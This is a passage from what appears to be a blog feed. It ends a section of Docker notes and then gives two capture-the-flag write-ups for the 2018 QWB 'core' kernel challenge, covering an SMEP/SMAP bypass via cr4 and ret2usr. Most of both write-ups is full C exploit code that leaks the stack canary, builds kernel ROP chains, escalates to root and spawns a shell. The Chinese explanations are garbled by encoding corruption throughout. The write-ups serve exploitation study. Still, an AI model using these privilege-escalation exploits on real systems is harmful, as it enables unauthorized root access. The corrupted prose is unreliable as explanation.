[â€œå¯æ‰§è¡Œæ–‡ä»¶â€, â€œå‚æ•°1â€, â€œå‚æ•°2â€â€¦]</li><li>shellæ ¼å¼çš„CMD echo $HOMEæ‰§è¡Œæ—¶ä¼šå˜ä¸ºCMD[ â€œshâ€, â€œ-câ€, â€œecho $HOMEâ€ ]</li></ul><p><code>ENTRYPOINT</code> æŒ‡ä»¤æ ¼å¼å’Œç›®çš„å’Œ<code>CMD</code>ä¸€æ ·</p><ul><li><a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/entrypoint">https://yeasy.gitbook.io/docker_practice/image/dockerfile/entrypoint</a></li></ul><p><code>ENV</code>  è®¾ç½®ç¯å¢ƒå˜é‡ï¼Œåé¢çš„å…¶å®ƒæŒ‡ä»¤å¯ä»¥ä½¿ç”¨æ­¤å˜é‡ï¼Œå’Œshellä¸‹è¡Œä¸ºä¸€è‡´</p><ul><li>ENV <key1>&#x3D;<value1> <key2>&#x3D;<value2>â€¦</value2></key2></value1></key1></li></ul><p><code>ARG</code> è®¾ç½®çš„æ„å»ºç¯å¢ƒçš„ç¯å¢ƒå˜é‡ï¼Œåœ¨å°†æ¥å®¹å™¨è¿è¡Œæ—¶æ˜¯ä¸ä¼šå­˜åœ¨è¿™äº›ç¯å¢ƒå˜é‡çš„</p><ul><li>ARG &lt;å‚æ•°å&gt;[&#x3D;&lt;é»˜è®¤å€¼&gt;]</li><li>docker build â€“build-arg &lt;å‚æ•°å&gt;&#x3D;&lt;å€¼&gt;å¯ä»¥æ¥è¦†ç›–å€¼</li></ul><p><code>VOLUME</code> å®šä¹‰åŒ¿åå·ï¼Œç”¨äºæ•°æ®ä¿å­˜å’ŒæŒä¹…åŒ–å·¥ä½œ</p><ul><li>VOLUME [â€œ&lt;è·¯å¾„1&gt;â€, â€œ&lt;è·¯å¾„2&gt;â€â€¦]</li></ul><p><code>EXPOSE</code> ä»…ä»…æ˜¯å£°æ˜å®¹å™¨æ‰“ç®—ä½¿ç”¨ä»€ä¹ˆç«¯å£</p><ul><li>EXPOSE &lt;ç«¯å£1&gt; [&lt;ç«¯å£2&gt;â€¦]</li></ul><p><code>WORKDIR</code> æŒ‡å®šå·¥ä½œç›®å½•ï¼Œä»¥åå„å±‚çš„å½“å‰ç›®å½•å°±è¢«æ”¹ä¸ºæŒ‡å®šçš„ç›®å½•</p><ul><li>WORKDIR &lt;å·¥ä½œç›®å½•è·¯å¾„&gt;</li></ul><p><code>USER</code> æŒ‡å®šå½“å‰ç”¨æˆ·</p><ul><li>USER &lt;ç”¨æˆ·å&gt;[:&lt;ç”¨æˆ·ç»„&gt;]</li><li>æ”¹å˜ç¯å¢ƒçŠ¶æ€å¹¶å½±å“ä»¥åçš„å±‚</li><li>ç”¨æˆ·å¿…é¡»æ˜¯æå‰å»ºç«‹å¥½çš„</li></ul><p><code>HEALTHCHECK</code> å¥åº·æ£€æµ‹</p><p><code>ONBUILD</code>  åé¢çš„æŒ‡ä»¤åœ¨å½“å‰é•œåƒæ„å»ºæ—¶å¹¶ä¸ä¼šè¢«æ‰§è¡Œã€‚åªæœ‰å½“ä»¥å½“å‰é•œåƒä¸ºåŸºç¡€é•œåƒï¼Œå»æ„å»ºä¸‹ä¸€çº§é•œåƒçš„æ—¶å€™æ‰ä¼šè¢«æ‰§è¡Œ</p><ul><li>ONBUILD &lt;å…¶å®ƒæŒ‡ä»¤&gt;</li></ul><p><code>LABEL</code> ç»™é•œåƒä»¥é”®å€¼å¯¹çš„å½¢å¼æ·»åŠ ä¸€äº›å…ƒæ•°æ®</p><ul><li>LABEL &lt;key&gt;&#x3D;&lt;value&gt; &lt;key&gt;&#x3D;&lt;value&gt; &lt;key&gt;&#x3D;&lt;value&gt; â€¦</li></ul><p><code>SHELL</code>  æŒ‡å®š <code>RUN</code> <code>ENTRYPOINT</code> <code>CMD</code> æŒ‡ä»¤çš„ shell</p><ul><li>SHELL [â€œexecutableâ€, â€œparametersâ€]</li></ul><h2 id="Docker-Compose"><a href="#Docker-Compose" class="headerlink" title="Docker Compose"></a>Docker Compose</h2><p>ä¸€ä¸ªé¡¹ç›®å¯ä»¥ç”±å¤šä¸ªæœåŠ¡ï¼ˆå®¹å™¨ï¼‰å…³è”è€Œæˆï¼Œ<code>Compose</code> é¢å‘é¡¹ç›®è¿›è¡Œç®¡ç†</p><p>å®‰è£…</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@Ubuntu22:/home/grxer# sudo curl -L https://github.com/docker/compose/releases/download/v2.20.3/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_">  % </span><span class="language-bash">Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span></span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0</span><br><span class="line">100 56.6M  100 56.6M    0     0  12.3M      0  0:00:04  0:00:04 --:--:-- 14.1M</span><br><span class="line">root@Ubuntu22:/home/grxer# sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line">root@Ubuntu22:/home/grxer# docker-compose --version</span><br><span class="line">Docker Compose version v2.20.3x</span><br></pre></td></tr></table></figure><p><a href="https://yeasy.gitbook.io/docker_practice/compose/commands">å‘½ä»¤</a></p><p><a href="https://yeasy.gitbook.io/docker_practice/compose/compose_file">docker-compose.yml</a></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a href="https://yeasy.gitbook.io/docker_practice">https://yeasy.gitbook.io/docker_practice</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Bypass smep smap</title>
      <link href="/2023/08/16/kernel-bypass-smep/"/>
      <url>/2023/08/16/kernel-bypass-smep/</url>
      
        <content type="html"><![CDATA[<p>k</p><p><img src="/2023/08/16/kernel-bypass-smep/image-20230816220503539.png" alt="image-20230816220503539"></p><p>æŠŠcr4 20ï¼Œ21ä½æŒ‡ä»¤å³å¯ï¼Œä¸€èˆ¬ç½®ä¸º0x6f0,cr4å¯ä»¥ç›´æ¥ç”¨movæ“ä½œ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov cr4,0x6f0</span><br></pre></td></tr></table></figure><p>vmlinuxé‡Œæ‰¾äº›æ“ä½œcr4çš„gadgetåˆ©ç”¨</p><h2 id="å¼ºç½‘æ¯-2018-core"><a href="#å¼ºç½‘æ¯-2018-core" class="headerlink" title="å¼ºç½‘æ¯ 2018 - core"></a>å¼ºç½‘æ¯ 2018 - core</h2><p>å¼€å¯ä¸‹sempï¼Œsmapä¿æŠ¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./core.cpio \</span><br><span class="line">    -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">     -cpu qemu64-v1,+smep,+smap \</span><br><span class="line">    -s \</span><br><span class="line">    -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">    -nographic</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/ $ grep smep /proc/cpuinfo</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov patp</span><br><span class="line">/ $ grep smap /proc/cpuinfo</span><br><span class="line">flags           : fpu de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov patp</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> + bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  save_status();</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81075014: mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias;<span class="comment">//pop rdi; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81075014</span> + bias;<span class="comment">//mov cr4, rdi; push rdx; popfq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span> + bias; <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell;       <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/16/kernel-bypass-smep/image-20230816215642698.png" alt="image-20230816215642698"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel Ret2usr</title>
      <link href="/2023/08/16/kernel-ret2usr/"/>
      <url>/2023/08/16/kernel-ret2usr/</url>
      
        <content type="html"><![CDATA[<p>å¯¹äºæ²¡å¼€ <strong>SMAP&#x2F;SMEP</strong>æˆ–è€…å¯ä»¥ä¿®æ”¹cr4å¯„å­˜å™¨20ï¼Œ21ä½çš„å†…æ ¸ï¼Œå¯ä»¥ä½¿ç”¨ret2usrï¼Œæ­¤æ—¶å†…æ ¸å¯ä»¥è®¿é—®&#x2F;æ‰§è¡Œç”¨æˆ·æ€çš„ä»£ç ï¼Œæ‰€ä»¥åªéœ€è¦æå‰åœ¨ç”¨æˆ·æ€å‡†å¤‡å¥½ææƒå‡½æ•°ï¼Œæƒ³åŠæ³•è®©å†…æ ¸å»æ‰§è¡Œ</p><p>KPTI çš„å‡ºç°ret2usræˆä¸ºè¿‡å»å¼äº†</p><h2 id="2018-å¼ºç½‘æ¯-core"><a href="#2018-å¼ºç½‘æ¯-core" class="headerlink" title="2018 å¼ºç½‘æ¯ - core"></a>2018 å¼ºç½‘æ¯ - core</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getRootPrivilige</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">void</span> * (*prepare_kernel_cred_ptr)(<span class="type">void</span> *) = prepare_kernel_cred;</span><br><span class="line">    <span class="type">int</span> (*commit_creds_ptr)(<span class="type">void</span> *) = commit_creds;</span><br><span class="line">    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  save_status();</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)getRootPrivilige;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/16/kernel-ret2usr/image-20230816203017727.png" 